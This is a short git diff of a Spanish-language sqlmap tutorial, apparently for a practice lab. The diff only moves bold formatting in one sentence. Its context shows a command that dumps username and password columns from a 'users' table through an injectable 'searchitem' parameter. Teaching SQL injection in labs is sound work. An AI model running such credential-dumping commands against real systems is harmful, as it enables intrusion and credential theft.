@@ -87,7 +87,7 @@ Una vez obtenidas las tablas, ahora vamos a querer que nos enumere las **columna
 	# columns = Queremos que nos muestre las columnas de la DB que elegimos 
 ```
 
-Una vez obtenidas las columnas podemos hacer que nos **muestre (Dumpear)** sus valores
+Una vez obtenidas las columnas podemos hacer que nos muestre **(Dumpear)** sus valores
 
 ```bash
 ❯ sqlmap -r example.req -p searchitem --batch -D sqltraining -T users -C username,password --dump
